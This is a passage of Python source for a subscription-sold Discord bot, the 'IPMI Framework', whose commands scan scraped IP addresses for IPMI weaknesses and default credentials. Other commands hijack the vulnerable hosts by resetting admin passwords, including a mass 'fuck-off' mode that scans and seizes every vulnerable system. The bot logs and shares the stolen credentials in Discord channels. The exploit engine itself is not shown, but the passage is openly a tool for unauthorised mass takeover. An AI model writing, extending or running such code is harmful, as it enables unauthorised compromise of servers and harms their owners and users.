    @discord.ui.button(label="Download", style=discord.ButtonStyle.grey)
    async def download_button(self, interaction: discord.Interaction, button: Button):
        if interaction.user.id != self.user_id:
            await interaction.response.send_message("You don't control this!", ephemeral=True)
            return
        buffer = io.StringIO()
        buffer.write("\n".join(self.ip_list))
        buffer.seek(0)
        file = discord.File(buffer, filename=self.filename)
        await interaction.response.send_message(file=file, ephemeral=True)
        buffer.close()


@bot.command(name='help')
async def help_command(ctx):
    is_owner = ctx.author.id in CONFIG.OWNER_IDS
    prefix = ctx.prefix
    
    if not is_owner and not await has_id_permission(ctx.author.id):
        await ctx.send("You are not allowed to use this bot. Purchase subscription ($6/mo) to use the bot.")
        return
    
    embed = discord.Embed(
        title="🤖 IPMI Framework - Help",
        description=f"**Prefix:** `{prefix}`\n**Version:** {version}\n**Made by:** GG!\n\nA powerful IPMI scraping and exploitation framework.",
        color=discord.Color.blue()
    )
    
    # User commands
    user_cmds = (
        f"`{prefix}ips` - Get all collected IPs\n"
        f"`{prefix}ipinfo <ip>` - Get IP information\n"
        f"`{prefix}ping` - Check bot latency"
    )
    embed.add_field(name="👤 User Commands", value=user_cmds, inline=False)
    
    if is_owner:
        admin_cmds = (
            f"`{prefix}adduser <@user>` - Add user access\n"
            f"`{prefix}removeuser <@user>` - Remove user access\n"
            f"`{prefix}setstatus #channel` - Set status channel\n"
            f"`{prefix}setvulnchannel #channel` - Set vulnerability channel\n"
            f"`{prefix}sethijackchannel #channel` - Set hijack channel\n"
            f"`{prefix}setipschannel #channel` - Set IPs channel\n"
            f"`{prefix}vulns-scan` - Scan all IPs for vulnerabilities\n"
            f"`{prefix}hijack-system <ip>` - Hijack IPMI system\n"
            f"`{prefix}hijack-acc <target>` - Hijack all existing accounts\n"
            f"`{prefix}fuck-off` - Scan & hijack ALL systems\n"
            f"`{prefix}systems` - List all systems status\n"
            f"`{prefix}status` - Full system status\n"
            f"`{prefix}fetch-1000` - Get 1000 urgent IPs\n"
            f"`{prefix}vps-lock <ip>` - Hijack VPS via Redfish\n"
            f"`{prefix}scrape-status` - Check scraper status\n"
            f"`{prefix}export <type>` - Export data (vuln/hijacked/all)\n"
            f"`{prefix}clear-db` - Clear database entries"
        )
        embed.add_field(name="👑 Owner Commands", value=admin_cmds, inline=False)
    
    embed.set_footer(text=f"VERSION: {version} | Made by GG!")
    if ctx.guild.icon:
        embed.set_thumbnail(url=ctx.guild.icon.url)
    
    await ctx.send(embed=embed)


@bot.command(name='ping')
async def ping(ctx):
    try:
        command_start = time.time()
        api_latency = round(bot.latency * 1000)
        
        embed = discord.Embed(
            title='🏓 Pong!',
            description=(
                f'**Latency:** `{api_latency}ms`\n'
                f'**Uptime:** <t:{int(bot.start_time.timestamp())}:R>\n'
                f'**Version:** `{version}`'
            ),
            color=discord.Color.green()
        )
        embed.set_footer(text=f'Requested by {ctx.author}')
        embed.timestamp = datetime.now(timezone.utc)
        
        message = await ctx.send(embed=embed)
        ping_time = round((message.created_at.timestamp() - ctx.message.created_at.timestamp()) * 1000)
        reply_speed = round((time.time() - command_start), 3)
        
        embed.description = (
            f'**Latency:** `{api_latency}ms`\n'
            f'**Ping:** `{ping_time}ms`\n'
            f'**Reply Speed:** `{reply_speed}s`\n'
            f'**Uptime:** <t:{int(bot.start_time.timestamp())}:R>\n'
            f'**Version:** `{version}`'
        )
        await message.edit(embed=embed)
    except Exception as e:
        await ctx.send(f"Error: {e}")


@bot.command(name='adduser')
@owner_only()
async def add_user(ctx, member: discord.Member):
    embed = discord.Embed(title="👤 User Management", color=discord.Color.green())
    existing_user = db_manager.fetchone("SELECT * FROM users WHERE discord_id = ?", (member.id,))
    if existing_user:
        embed.description = f"{member.name} is already registered!"
        embed.color = discord.Color.red()
    else:
        db_manager.execute(
            "INSERT INTO users (discord_id, has_permission, works, username) VALUES (?, ?, ?, ?)",
            (member.id, True, True, member.name)
        )
        embed.description = f"✅ {member.name} added as a user!"
    await ctx.send(embed=embed)


@bot.command(name='removeuser')
@owner_only()
async def remove_user(ctx, member: discord.Member):
    embed = discord.Embed(title="👤 User Management", color=discord.Color.red())
    existing_user = db_manager.fetchone("SELECT * FROM users WHERE discord_id = ?", (member.id,))
    if not existing_user:
        embed.description = f"{member.name} is not registered!"
    else:
        db_manager.execute("DELETE FROM users WHERE discord_id = ?", (member.id,))
        embed.description = f"✅ {member.name} removed as a user!"
    await ctx.send(embed=embed)


@bot.command(name='setstatus')
@owner_only()
async def set_status_channel(ctx, channel: discord.TextChannel):
    embed = discord.Embed(title="📡 Status Channel Update", color=discord.Color.green())
    try:
        bot.update_channel = channel
        CONFIG.STATUS_CHANNEL_ID = channel.id
        db_manager.execute("INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)", 
                          ('status_channel_id', str(channel.id)))
        embed.description = f"✅ Status updates will now be sent to {channel.mention}!"
        await ctx.send(embed=embed)
        
        # Send initial status
        ip_count_row = db_manager.fetchone("SELECT COUNT(*) FROM scraped_ips")
        ip_count = ip_count_row[0] if ip_count_row else 0
        vuln_count_row = db_manager.fetchone("SELECT COUNT(*) FROM vulnerable_ips")
        vuln_count = vuln_count_row[0] if vuln_count_row else 0
        
        now = datetime.now(timezone.utc)
        test_embed = discord.Embed(
            title="📊 DATABASE STATUS",
            color=discord.Color.blue(),
            timestamp=now
        )
        test_embed.add_field(name="Total IPs", value=f"{ip_count}", inline=True)
        test_embed.add_field(name="Vulnerable", value=f"{vuln_count}", inline=True)
        test_embed.add_field(name="Status", value="✅ Online", inline=True)
        test_embed.set_footer(text=f"VERSION: {version} | Made by GG!")
        
        message = await channel.send(embed=test_embed)
        bot.last_status_message_id = message.id
    except Exception as e:
        embed.description = f"❌ Failed: {str(e)}"
        embed.color = discord.Color.red()
        await ctx.send(embed=embed)


@bot.command(name='setvulnchannel')
@owner_only()
async def set_vuln_channel(ctx, channel: discord.TextChannel):
    CONFIG.VULN_CHANNEL_ID = channel.id
    db_manager.execute("INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)",
                      ('vuln_channel_id', str(channel.id)))
    embed = discord.Embed(
        title="🔴 Vulnerability Channel Set",
        description=f"Vulnerability alerts will go to {channel.mention}",
        color=discord.Color.red()
    )
    await ctx.send(embed=embed)


@bot.command(name='sethijackchannel')
@owner_only()
async def set_hijack_channel(ctx, channel: discord.TextChannel):
    CONFIG.HIJACK_CHANNEL_ID = channel.id
    db_manager.execute("INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)",
                      ('hijack_channel_id', str(channel.id)))
    embed = discord.Embed(
        title="🔒 Hijack Channel Set",
        description=f"Hijack details will go to {channel.mention}",
        color=discord.Color.dark_red()
    )
    await ctx.send(embed=embed)


@bot.command(name='setipschannel')
@owner_only()
async def set_ips_channel(ctx, channel: discord.TextChannel):
    CONFIG.IPS_CHANNEL_ID = channel.id
    db_manager.execute("INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)",
                      ('ips_channel_id', str(channel.id)))
    embed = discord.Embed(
        title="📋 IPs Channel Set",
        description=f"IP updates will go to {channel.mention}",
        color=discord.Color.blue()
    )
    await ctx.send(embed=embed)


@bot.command(name='ips')
async def ips(ctx):
    if not await has_id_permission(ctx.author.id) and ctx.author.id not in CONFIG.OWNER_IDS:
        await ctx.send("You are not allowed to use this bot. Purchase subscription ($6/mo) to use the bot.")
        return
    
    user = db_manager.fetchone("SELECT * FROM users WHERE discord_id = ?", (ctx.author.id,))
    if user and not user['works']:
        await ctx.send("Your IP access is disabled!")
        return
    
    try:
        scraped_ips = [row['ip_address'] for row in db_manager.fetchall("SELECT ip_address FROM scraped_ips")]
        if not scraped_ips:
            await ctx.send("No IPs registered!")
            return
        
        embed = discord.Embed(
            title="📋 IPMI IPs",
            description=f"Total IPs in database: **{len(scraped_ips)}**",
            color=discord.Color.blue()
        )
        embed.set_footer(text=f"VERSION: {version} | Made by GG!")
        
        buffer = io.StringIO()
        buffer.write("\n".join(scraped_ips))
        buffer.seek(0)
        file = discord.File(buffer, filename="ipmi_ips.txt")
        await ctx.send(embed=embed, file=file)
        buffer.close()
    except Exception as e:
        logger.error(f"Error fetching IPs: {e}")
        owner_mentions = " ".join([f"<@{owner_id}>" for owner_id in CONFIG.OWNER_IDS])
        await ctx.send(f"Failed to fetch IPs! {owner_mentions} - DB issue!")


@bot.command(name='ipinfo')
async def ipinfo(ctx, ip: str):
    if not await has_id_permission(ctx.author.id) and ctx.author.id not in CONFIG.OWNER_IDS:
        await ctx.send("You are not allowed to use this bot.")
        return
    
    await ctx.message.delete()
    
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(f"https://ipinfo.io/{ip}/json") as resp:
                data = await resp.json()
        
        if "bogon" in data:
            await ctx.author.send("❌ Invalid/Private IP")
            return
        
        country_code = data.get("country", "N/A")
        try:
            country_name = pycountry.countries.get(alpha_2=country_code).name
        except AttributeError:
            country_name = "N/A"
        
        embed = discord.Embed(
            title="🌐 IP Information",
            color=discord.Color.dark_red()
        )
        embed.add_field(name="IP Address", value=data.get("ip", "N/A"), inline=False)
        embed.add_field(name="City", value=data.get("city", "N/A"), inline=True)
        embed.add_field(name="Region", value=data.get("region", "N/A"), inline=True)
        embed.add_field(name="Country", value=country_name, inline=True)
        embed.add_field(name="ISP", value=data.get("org", "N/A"), inline=False)
        embed.add_field(name="Location", value=data.get("loc", "N/A"), inline=False)
        embed.set_footer(text=f"VERSION: {version} | Made by GG!")
        
        await ctx.author.send(embed=embed)
        await ctx.send("✅ IP details have been sent to your DMs.", delete_after=5)
    except Exception as e:
        await ctx.send(f"❌ Error fetching IP info: {e}", delete_after=5)


@bot.command(name='vulns-scan')
@owner_only()
async def vulns_scan(ctx):
    """Scan all collected IPs for IPMI vulnerabilities"""
    embed = discord.Embed(
        title="🔍 Starting Vulnerability Scan",
        description="Scanning all IPs in database for IPMI vulnerabilities...",
        color=discord.Color.blue()
    )
    msg = await ctx.send(embed=embed)
    
    # Get all IPs
    all_ips = [row['ip_address'] for row in db_manager.fetchall("SELECT ip_address FROM scraped_ips")]
    
    if not all_ips:
        await msg.edit(embed=discord.Embed(
            title="❌ No IPs",
            description="No IPs in database to scan.",
            color=discord.Color.red()
        ))
        return
    
    exploit_engine = IPMIExploitEngine()
    vulnerable_ips = []
    scanned = 0
    
    connector = TCPConnector(limit=25)
    async with aiohttp.ClientSession(connector=connector) as session:
        # Process in batches of 50
        batch_size = 50
        for i in range(0, len(all_ips), batch_size):
            batch = all_ips[i:i + batch_size]
            tasks = [exploit_engine.scan_vulnerability(session, ip) for ip in batch]
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            for result in results:
                if isinstance(result, dict) and result.get("vulnerable"):
                    vulnerable_ips.append(result)
                    # Save to database
                    vulns_str = ", ".join(result["vulnerabilities"])
                    db_manager.execute(
                        "INSERT OR REPLACE INTO vulnerable_ips (ip_address, port, service, vulnerability, detected_at, username, password) VALUES (?, ?, ?, ?, ?, ?, ?)",
                        (
                            result["ip"],
                            result["open_ports"][0] if result["open_ports"] else 623,
                            "IPMI",
                            vulns_str,
                            datetime.now(timezone.utc).isoformat(),
                            result["default_creds"][0] if result["default_creds"] else "",
                            result["default_creds"][1] if result["default_creds"] else ""
                        )
                    )
                    
                    # Log to vulnerable.txt
                    with open("vulnerable.txt", "a") as f:
                        f.write(f"{result['ip']} | Ports: {result['open_ports']} | Vulns: {vulns_str} | Creds: {result.get('default_creds', 'N/A')}\n")
            
            scanned += len(batch)
            progress = int((scanned / len(all_ips)) * 100)
            await msg.edit(embed=discord.Embed(
                title="🔍 Vulnerability Scan in Progress",
                description=f"Scanned: **{scanned}/{len(all_ips)}** IPs ({progress}%)\n"
                           f"Vulnerable found: **{len(vulnerable_ips)}**",
                color=discord.Color.blue()
            ))
    
    # Send results
    vuln_count = len(vulnerable_ips)
    result_embed = discord.Embed(
        title="✅ Vulnerability Scan Complete",
        description=f"Scanned **{scanned}** IPs\n"
                   f"Found **{vuln_count}** vulnerable systems",
        color=discord.Color.red() if vuln_count > 0 else discord.Color.green()
    )
    
    if vulnerable_ips:
        # Show top 10
        top_vulns = "\n".join([
            f"`{v['ip']}` - {', '.join(v['vulnerabilities'][:2])}" 
            for v in vulnerable_ips[:10]
        ])
        result_embed.add_field(name="Top Vulnerable Systems", value=f"```css\n{top_vulns}\n```" if top_vulns else "None", inline=False)
        
        # Send file with all vulnerable IPs
        buffer = io.StringIO()
        for v in vulnerable_ips:
            buffer.write(f"{v['ip']} | Ports: {v['open_ports']} | Vulns: {', '.join(v['vulnerabilities'])} | Creds: {v.get('default_creds', 'N/A')}\n")
        buffer.seek(0)
        file = discord.File(buffer, filename="vulnerable_ips.txt")
        await ctx.send(file=file)
        buffer.close()
        
        # Send to vuln channel if configured
        if CONFIG.VULN_CHANNEL_ID:
            channel = bot.get_channel(int(CONFIG.VULN_CHANNEL_ID))
            if channel:
                vuln_embed = discord.Embed(
                    title=f"🔴 {vuln_count} Vulnerable Systems Found",
                    description=f"Scan completed at <t:{int(time.time())}:F>",
                    color=discord.Color.red()
                )
                vuln_embed.add_field(name="Total Scanned", value=str(scanned), inline=True)
                vuln_embed.add_field(name="Vulnerable", value=str(vuln_count), inline=True)
                vuln_embed.set_footer(text=f"VERSION: {version} | Made by GG!")
                await channel.send(embed=vuln_embed, file=file)
    
    await msg.edit(embed=result_embed)
    logger.info(f"Vulnerability scan complete: {vuln_count} vulnerable out of {scanned} scanned")


@bot.command(name='hijack-system')
@owner_only()
async def hijack_system(ctx, ip: str):
    """Hijack an IPMI system - change admin password and take control"""
    embed = discord.Embed(
        title="🔒 Attempting System Hijack",
        description=f"Target: `{ip}`\nAttempting to gain control...",
        color=discord.Color.blue()
    )
    msg = await ctx.send(embed=embed)
    
    # Check if we already have credentials
    existing = db_manager.fetchone("SELECT * FROM vulnerable_ips WHERE ip_address = ?", (ip,))
    
    username = "admin"
    password = None
    
    if existing and existing['username'] and existing['password']:
        username = existing['username']
        password = existing['password']
        await msg.edit(embed=discord.Embed(
            title="🔒 System Hijack",
            description=f"Target: `{ip}`\nUsing existing credentials: `{username}:{password}`",
            color=discord.Color.blue()
        ))
    
    exploit_engine = IPMIExploitEngine()
    result = await exploit_engine.hijack_system(ip, username, password)
    
    if result["success"]:
        # Save to database
        db_manager.execute(
            "INSERT OR REPLACE INTO hijacked_systems (ip_address, username, password, hijacked_at, hijack_type, method) VALUES (?, ?, ?, ?, ?, ?)",
            (
                ip,
                result["username"],
                result["new_password"],
                datetime.now(timezone.utc).isoformat(),
                "IPMI",
                result["method"]
            )
        )
        
        # Log to file
        with open("hijacked_systems.txt", "a") as f:
            f.write(f"{ip} | User: {result['username']} | Pass: {result['new_password']} | Method: {result['method']} | Time: {datetime.now(timezone.utc).isoformat()}\n")
        
        success_embed = discord.Embed(
            title="✅ SYSTEM HIJACKED!",
            description=f"**Target:** `{ip}`\n"
                       f"**Username:** `{result['username']}`\n"
                       f"**Password:** `{result['new_password']}`\n"
                       f"**Method:** `{result['method']}`",
            color=discord.Color.green()
        )
        success_embed.set_footer(text=f"VERSION: {version} | Made by GG!")
        await msg.edit(embed=success_embed)
        
        # Send to hijack channel
        if CONFIG.HIJACK_CHANNEL_ID:
            channel = bot.get_channel(int(CONFIG.HIJACK_CHANNEL_ID))
            if channel:
                hijack_embed = discord.Embed(
                    title="🚨 SYSTEM HIJACKED!",
                    description=f"**Target IP:** `{ip}`\n"
                               f"**Username:** `{result['username']}`\n"
                               f"**Password:** `{result['new_password']}`\n"
                               f"**Method:** `{result['method']}`\n"
                               f"**Time:** <t:{int(time.time())}:F>",
                    color=discord.Color.red()
                )
                hijack_embed.set_footer(text=f"VERSION: {version} | Made by GG!")
                await channel.send(embed=hijack_embed)
        
        logger.info(f"[+] SUCCESS: System {ip} hijacked! New pass: {result['new_password']}")
    else:
        fail_embed = discord.Embed(
            title="❌ Hijack Failed",
            description=f"**Target:** `{ip}`\n"
                       f"**Reason:** {result['details']}",
            color=discord.Color.red()
        )
        await msg.edit(embed=fail_embed)


@bot.command(name='hijack-acc')
@owner_only()
async def hijack_acc(ctx, target: str = None):
    """Hijack all existing accounts on vulnerable systems"""
    embed = discord.Embed(
        title="🔑 Hijacking All Accounts",
        description="Attempting to hijack all vulnerable systems...",
        color=discord.Color.blue()
    )
    msg = await ctx.send(embed=embed)
    
    # Get targets
    if target:
        targets = [target]
    else:
        targets = [row['ip_address'] for row in db_manager.fetchall("SELECT ip_address FROM vulnerable_ips")]
    
    if not targets:
        embed.description = "❌ No vulnerable targets found. Run `!vulns-scan` first."
        embed.color = discord.Color.red()
        await msg.edit(embed=embed)
        return
    
    exploit_engine = IPMIExploitEngine()
    successful = []
    failed = []
    
    for i, ip in enumerate(targets):
        status_embed = discord.Embed(
            title="🔑 Hijacking Accounts",
            description=f"Progress: **{i+1}/{len(targets)}**\nCurrent: `{ip}`",
            color=discord.Color.blue()
        )
        await msg.edit(embed=status_embed)
        
        # Check existing creds
        existing = db_manager.fetchone("SELECT * FROM vulnerable_ips WHERE ip_address = ?", (ip,))
        username = existing['username'] if existing and existing['username'] else "admin"
        password = existing['password'] if existing and existing['password'] else None
        
        result = await exploit_engine.hijack_system(ip, username, password)
        
        if result["success"]:
            successful.append(result)
            db_manager.execute(
                "INSERT OR REPLACE INTO hijacked_systems (ip_address, username, password, hijacked_at, hijack_type, method) VALUES (?, ?, ?, ?, ?, ?)",
                (ip, result["username"], result["new_password"], datetime.now(timezone.utc).isoformat(), "IPMI", result["method"])
            )
            with open("hijacked_systems.txt", "a") as f:
                f.write(f"{ip} | User: {result['username']} | Pass: {result['new_password']} | Method: {result['method']}\n")
        else:
            failed.append({"ip": ip, "reason": result["details"]})
        
        await asyncio.sleep(1)  # Rate limiting
    
    # Results
    result_embed = discord.Embed(
        title="✅ Account Hijack Complete",
        description=f"**Total targets:** {len(targets)}\n"
                   f"**Successful:** {len(successful)}\n"
                   f"**Failed:** {len(failed)}",
        color=discord.Color.green() if successful else discord.Color.red()
    )
    
    if successful:
        hijack_list = "\n".join([
            f"`{h['ip']}` - {h['username']}:{h['new_password']}" 
            for h in successful[:10]
        ])
        result_embed.add_field(name="Hijacked Systems", value=f"```css\n{hijack_list}\n```" if hijack_list else "None", inline=False)
        
        # Send file
        buffer = io.StringIO()
        for h in successful:
            buffer.write(f"{h['ip']} | {h['username']}:{h['new_password']} | {h['method']}\n")
        buffer.seek(0)
        file = discord.File(buffer, filename="hijacked_accounts.txt")
        await ctx.send(file=file)
        buffer.close()
    
    if failed:
        fail_list = "\n".join([f"`{f['ip']}` - {f['reason'][:50]}" for f in failed[:5]])
        result_embed.add_field(name="Failed", value=f"```diff\n- {fail_list}\n```" if fail_list else "None", inline=False)
    
    await msg.edit(embed=result_embed)
    
    # Send to hijack channel
    if successful and CONFIG.HIJACK_CHANNEL_ID:
        channel = bot.get_channel(int(CONFIG.HIJACK_CHANNEL_ID))
        if channel:
            hijack_embed = discord.Embed(
                title=f"🚨 {len(successful)} Systems Hijacked!",
                description=f"Batch account hijack completed at <t:{int(time.time())}:F>",
                color=discord.Color.red()
            )
            hijack_embed.add_field(name="Hijacked", value=str(len(successful)), inline=True)
            hijack_embed.add_field(name="Failed", value=str(len(failed)), inline=True)
            hijack_embed.set_footer(text=f"VERSION: {version} | Made by GG!")
            await channel.send(embed=hijack_embed)
    
    logger.info(f"Account hijack complete: {len(successful)} success, {len(failed)} failed")


@bot.command(name='fuck-off')
@owner_only()
async def fuck_off(ctx):
    """Nuclear option - Scan ALL IPs and hijack every vulnerable system"""
    embed = discord.Embed(
        title="☢️ FUCK OFF MODE ACTIVATED",
        description="**Full system compromise initiated**\n\n"
                   "Phase 1: Scanning all IPs for vulnerabilities\n"
                   "Phase 2: Hijacking all vulnerable systems\n"
                   "Phase 3: Reporting results",
        color=discord.Color.red()
    )
    embed.set_footer(text=f"VERSION: {version} | Made by GG!")
    msg = await ctx.send(embed=embed)
    
    # Phase 1: Get all IPs
    all_ips = [row['ip_address'] for row in db_manager.fetchall("SELECT ip_address FROM scraped_ips")]
    
    if not all_ips:
        await msg.edit(embed=discord.Embed(
            title="❌ No IPs",
            description="No IPs in database. Run scraper first.",
            color=discord.Color.red()
        ))
        return
    
    # Update status
    await msg.edit(embed=discord.Embed(
        title="☢️ FUCK OFF - Phase 1",
        description=f"Scanning **{len(all_ips)}** IPs for vulnerabilities...",
        color=discord.Color.blue()
    ))
    
    exploit_engine = IPMIExploitEngine()
    vulnerable_ips = []
    
    connector = TCPConnector(limit=25)
    async with aiohttp.ClientSession(connector=connector) as session:
        # Scan all IPs
        batch_size = 50
        for i in range(0, len(all_ips), batch_size):
            batch = all_ips[i:i + batch_size]
            tasks = [exploit_engine.scan_vulnerability(session, ip) for ip in batch]
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            for result in results:
                if isinstance(result, dict) and result.get("vulnerable"):
                    vulnerable_ips.append(result)
                    vulns_str = ", ".join(result["vulnerabilities"])
                    db_manager.execute(
                        "INSERT OR REPLACE INTO vulnerable_ips (ip_address, port, service, vulnerability, detected_at, username, password) VALUES (?, ?, ?, ?, ?, ?, ?)",
                        (result["ip"], result["open_ports"][0] if result["open_ports"] else 623, "IPMI", vulns_str, datetime.now(timezone.utc).isoformat(), result["default_creds"][0] if result["default_creds"] else "", result["default_creds"][1] if result["default_creds"] else "")
                    )
                    with open("vulnerable.txt", "a") as f:
                        f.write(f"{result['ip']} | Ports: {result['open_ports']} | Vulns: {vulns_str} | Creds: {result.get('default_creds', 'N/A')}\n")
            
            progress = int(((i + batch_size) / len(all_ips)) * 100) if (i + batch_size) < len(all_ips) else 100
            await msg.edit(embed=discord.Embed(
                title="☢️ FUCK OFF - Phase 1",
                description=f"Scanning: **{min(i + batch_size, len(all_ips))}/{len(all_ips)}** ({progress}%)\n"
                           f"Vulnerable found: **{len(vulnerable_ips)}**",
                color=discord.Color.blue()
            ))
    
    if not vulnerable_ips:
        await msg.edit(embed=discord.Embed(
            title="❌ No Vulnerable Systems",
            description="No vulnerable systems found. Nothing to hijack.",
            color=discord.Color.red()
        ))
        return
    
    # Phase 2: Hijack all vulnerable systems
    await msg.edit(embed=discord.Embed(
        title="☢️ FUCK OFF - Phase 2",
        description=f"Hijacking **{len(vulnerable_ips)}** vulnerable systems...",
        color=discord.Color.orange()
    ))
    
    hijacked = []
    hijack_failed = []
    
    for i, vuln in enumerate(vulnerable_ips):
        ip = vuln["ip"]
        username = vuln["default_creds"][0] if vuln.get("default_creds") else "admin"
        password = vuln["default_creds"][1] if vuln.get("default_creds") else None
        
        result = await exploit_engine.hijack_system(ip, username, password)
        
        if result["success"]:
            hijacked.append(result)
            db_manager.execute(
                "INSERT OR REPLACE INTO hijacked_systems (ip_address, username, password, hijacked_at, hijack_type, method) VALUES (?, ?, ?, ?, ?, ?)",
                (ip, result["username"], result["new_password"], datetime.now(timezone.utc).isoformat(), "IPMI", result["method"])
            )
            with open("hijacked_systems.txt", "a") as f:
                f.write(f"{ip} | User: {result['username']} | Pass: {result['new_password']} | Method: {result['method']}\n")
        else:
            hijack_failed.append({"ip": ip, "reason": result["details"]})
        
        progress = int(((i + 1) / len(vulnerable_ips)) * 100)
        await msg.edit(embed=discord.Embed(
            title="☢️ FUCK OFF - Phase 2",
            description=f"Hijacking: **{i+1}/{len(vulnerable_ips)}** ({progress}%)\n"
                       f"Hijacked: **{len(hijacked)}**\n"
                       f"Failed: **{len(hijack_failed)}**",
            color=discord.Color.orange()
        ))
        
        await asyncio.sleep(0.5)  # Rate limiting
    
    # Phase 3: Results
    result_embed = discord.Embed(
        title="☢️ FUCK OFF COMPLETE",
        description=f"**Operation Summary**\n\n"
                   f"📡 Total IPs scanned: `{len(all_ips)}`\n"
                   f"🔍 Vulnerable found: `{len(vulnerable_ips)}`\n"
                   f"✅ Hijacked: `{len(hijacked)}`\n"
                   f"❌ Failed hijacks: `{len(hijack_failed)}`",
        color=discord.Color.green() if hijacked else discord.Color.red()
    )
    result_embed.set_footer(text=f"VERSION: {version} | Made by GG!")
    
    if hijacked:
        hijack_list = "\n".join([
            f"`{h['ip']}` - {h['username']}:{h['new_password']}" 
            for h in hijacked[:15]
        ])
        result_embed.add_field(name="🚨 Hijacked Systems", value=f"```css\n{hijack_list}\n```" if hijack_list else "None", inline=False)
        
        # Full list file
        buffer = io.StringIO()
        buffer.write("=== HIJACKED SYSTEMS ===\n")
        for h in hijacked:
            buffer.write(f"{h['ip']} | {h['username']}:{h['new_password']} | Method: {h['method']}\n")
        buffer.write(f"\n=== FAILED HIJACKS ===\n")
        for f in hijack_failed:
            buffer.write(f"{f['ip']} | Reason: {f['reason'][:100]}\n")
        buffer.seek(0)
        file = discord.File(buffer, filename="fuck_off_results.txt")
        await ctx.send(file=file)
        buffer.close()
    
    await msg.edit(embed=result_embed)
    
    # Send to channels
    if hijacked:
        if CONFIG.HIJACK_CHANNEL_ID:
            channel = bot.get_channel(int(CONFIG.HIJACK_CHANNEL_ID))
            if channel:
                hijack_embed = discord.Embed(
                    title=f"☢️ NUCLEAR STRIKE COMPLETE",
                    description=f"**{len(hijacked)}** systems hijacked at <t:{int(time.time())}:F>",
                    color=discord.Color.red()
                )
                hijack_embed.add_field(name="Total Scanned", value=str(len(all_ips)), inline=True)
                hijack_embed.add_field(name="Hijacked", value=str(len(hijacked)), inline=True)
                hijack_embed.set_footer(text=f"VERSION: {version} | Made by GG!")
                await channel.send(embed=hijack_embed)
        
        if CONFIG.VULN_CHANNEL_ID:
            channel = bot.get_channel(int(CONFIG.VULN_CHANNEL_ID))
            if channel:
                vuln_embed = discord.Embed(
                    title="🔴 Vulnerability Report",
                    description=f"Found {len(vulnerable_ips)} vulnerable systems during nuclear operation",
                    color=discord.Color.red()
                )
                vuln_embed.add_field(name="Vulnerable", value=str(len(vulnerable_ips)), inline=True)
                vuln_embed.add_field(name="Hijacked", value=str(len(hijacked)), inline=True)
                await channel.send(embed=vuln_embed)
    
    logger.info(f"[☢️] FUCK OFF complete: {len(hijacked)} hijacked, {len(hijack_failed)} failed")


@bot.command(name='systems')
@owner_only()
async def systems(ctx):
    """List all systems status - vulnerable count, hijacked count, total IPs"""
    total_ips = db_manager.fetchone("SELECT COUNT(*) FROM scraped_ips")[0] or 0
    vulnerable_count = db_manager.fetchone("SELECT COUNT(*) FROM vulnerable_ips")[0] or 0
    hijacked_count = db_manager.fetchone("SELECT COUNT(*) FROM hijacked_systems")[0] or 0
    vps_count = db_manager.fetchone("SELECT COUNT(*) FROM vps_hijacked")[0] or 0
    active_nodes = db_manager.fetchall("SELECT * FROM nodes WHERE status = 'active'")
    
    embed = discord.Embed(
        title="📊 SYSTEMS OVERVIEW",
        description=f"**Total Systems Tracked:** `{total_ips}`\n"
                   f"**Vulnerable:** `{vulnerable_count}`\n"
                   f"**Hijacked (IPMI):** `{hijacked_count}`\n"
                   f"**Hijacked (VPS):** `{vps_count}`\n"
                   f"**Total Hijacked:** `{hijacked_count + vps_count}`",
        color=discord.Color.blue()
    )
    
    if vulnerable_count > 0:
        vuln_ips = [row['ip_address'] for row in db_manager.fetchall("SELECT ip_address FROM vulnerable_ips LIMIT 10")]
        embed.add_field(name="🔴 Vulnerable Systems (Top 10)", 
                       value="\n".join([f"`{ip}`" for ip in vuln_ips]) or "None",
                       inline=False)
    
    if hijacked_count > 0:
        hijacked_ips = [row['ip_address'] for row in db_manager.fetchall("SELECT ip_address FROM hijacked_systems LIMIT 10")]
        embed.add_field(name="✅ Hijacked Systems (Top 10)",
                       value="\n".join([f"`{ip}`" for ip in hijacked_ips]) or "None",
                       inline=False)
    
    if active_nodes:
        embed.add_field(name="🟢 Active Nodes", 
                       value="\n".join([f"`{n['node_id']}` - {n['ips_scraped']} IPs" for n in active_nodes]) or "None",
                       inline=False)
    
    embed.set_footer(text=f"VERSION: {version} | Made by GG!")
    await ctx.send(embed=embed)


@bot.command(name='status')
@owner_only()
async def status(ctx):
    """Full system status - database, bot, all systems"""
    total_ips = db_manager.fetchone("SELECT COUNT(*) FROM scraped_ips")[0] or 0
    vulnerable_count = db_manager.fetchone("SELECT COUNT(*) FROM vulnerable_ips")[0] or 0
    hijacked_count = db_manager.fetchone("SELECT COUNT(*) FROM hijacked_systems")[0] or 0
    vps_count = db_manager.fetchone("SELECT COUNT(*) FROM vps_hijacked")[0] or 0
    user_count = db_manager.fetchone("SELECT COUNT(*) FROM users")[0] or 0
    
    db_connected = db_manager.get_connection() is not None
    api_latency = round(bot.latency * 1000)
    uptime_seconds = (datetime.now(timezone.utc) - bot.start_time).total_seconds()
    uptime_str = f"{int(uptime_seconds // 86400)}d {int((uptime_seconds % 86400) // 3600)}h {int((uptime_seconds % 3600) // 60)}m"
    
    embed = discord.Embed(
        title="📊 FULL SYSTEM STATUS",
        description=f"**Bot Status:** 🟢 Online\n"
                   f"**Version:** `{version}`\n"
                   f"**Uptime:** `{uptime_str}`\n"
                   f"**Latency:** `{api_latency}ms`",
        color=discord.Color.blue()
    )
    embed.set_footer(text=f"VERSION: {version} | Made by GG!")
    
    embed.add_field(name="💾 Database", 
                   value=f"**Status:** {'🟢 Connected' if db_connected else '🔴 Disconnected'}\n"
                        f"**Total IPs:** `{total_ips}`\n"
                        f"**Users:** `{user_count}`",
                   inline=True)
    
    embed.add_field(name="🎯 Exploitation",
                   value=f"**Vulnerable:** `{vulnerable_count}`\n"
                        f"**Hijacked (IPMI):** `{hijacked_count}`\n"
                        f"**Hijacked (VPS):** `{vps_count}`",
                   inline=True)
    
    embed.add_field(name="🔧 Commands",
                   value=f"**Prefix:** `!`\n"
                        f"**Owners:** `{len(CONFIG.OWNER_IDS)}` configured\n"
                        f"**Status Channel:** {'✅ Set' if CONFIG.STATUS_CHANNEL_ID else '❌ Not set'}",
                   inline=True)
    
